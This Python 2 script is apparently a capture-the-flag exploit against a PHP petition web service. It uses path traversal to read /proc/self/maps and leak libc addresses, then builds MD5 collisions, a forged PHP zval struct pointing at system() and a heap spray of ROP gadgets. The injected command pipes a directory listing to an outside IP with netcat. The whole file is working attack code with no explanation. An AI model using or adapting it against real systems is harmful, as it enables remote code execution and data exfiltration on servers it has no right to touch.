import subprocess
import hashlib
import requests
import pickle
import struct

p32 = lambda(x): struct.pack('<I', x)
u32 = lambda(x): struct.unpack('<I', x)[0]
p64 = lambda(x): struct.pack('<Q', x)
u64 = lambda(x): struct.unpack('<Q', x)[0]

url_base = 'http://0/'
url_base = 'https://school.fluxfingers.net:1531/'

def down(path):
	r = requests.get(url_base + 'index.php?pet=../../../../../' + path)
	d = r.content
	start = d.find('<textarea name="petitiontext" style="width: 100%;" rows="12">') + 61
	end = d.find('</textarea><br><br>')
	d = d[start:end]
	return d

def info(d):
	d = d.split('\n')	
	heaps = []
	for d_l in d:
		if 'libc-2.19.so' in d_l: heaps.append(d_l)	
	
	hs = []
	for h in heaps:
		r = h.split()[0]
		hs.append(r[:r.find('-')])

	return hs

def fastcoll(prefix):
    # assert len(prefix) == 64
    open('pf', 'w').write(prefix)
    subprocess.check_output(['./fastcoll', 'pf'])
    a = open('md5_data1').read()
    b = open('md5_data2').read()
    # assert hashlib.md5(a).digest() == hashlib.md5(b).digest()
    # assert a != b
    assert '\r' not in a
    assert '\r' not in b
    assert '\n' not in a
    assert '\n' not in b
    assert '\x0b' not in a
    assert '\x0b' not in b
    assert '\x0c' not in a
    assert '\x0c' not in b
    assert '\x85' not in a
    assert '\x85' not in b
    return a, b

if __name__ == '__main__':
	colls = pickle.load(open('colls'))
	payload = []

	for coll in colls:
		a, b = coll
		payload.append(a)
		payload.append(b)
	
	print len(colls)
	print len(payload)

	maps = down('/proc/self/maps')
	print maps
	libc_base = int(info(maps)[0], 16)
	gad = libc_base + 0x00108240
	system = libc_base + 0x46640
	'''	
   0x7f3a6793d240 <__libc_cleanup_routine+16>:	mov    0x8(%rdi),%rdx
   0x7f3a6793d244 <__libc_cleanup_routine+20>:	mov    (%rdi),%rax
   0x7f3a6793d247 <__libc_cleanup_routine+23>:	mov    %rdx,%rdi
   0x7f3a6793d24a <__libc_cleanup_routine+26>:	jmpq   *%rax
	'''
	
	print 'libc_base: ' + hex(libc_base)
	print hex(gad)

	try:
		heap_str = raw_input('input guess heap')
		heap_base = int(heap_str, 16)	
	except:
		pass

	fake_zval_struct = p64(system) # obj_id at 0
	fake_zval_struct += p64(heap_base) # obj_handlers at 8
	fake_zval_struct += p32(0x1) # ref_count at 16
	fake_zval_struct += p32(0x5) # type at 20
	fake_zval_struct += p64(0x0) # ref_flag at 24
	assert( len(fake_zval_struct) == 32 )
	fake_zval_struct = fake_zval_struct[:32 - 1 - 1]	

	#assert(False)
	
	petitiontext = fake_zval_struct
	#recipient = 'A' * 0x4
	#block = 'B' + 'A' * 0xfff
	block = ''
	block += 'ls /var/www|nc 202.120.7.111 1337'
	block = block.ljust(0x30, '\x00')
	block = block * 4
	block += p64(gad) * ((0x100 - 0xc0) / 8)
	
	recipient = block * (0x40000 / len(block))
	#payload = ['ppp', 'vvv']

	url = 'https://school.fluxfingers.net:1531/index.php'
	data = {'submit':'1', 'namelist':'\r'.join(payload), 'anon':'on', 'petitiontext': petitiontext, 'recipient': recipient}
	r = requests.post(url, data=data)
	print r.content
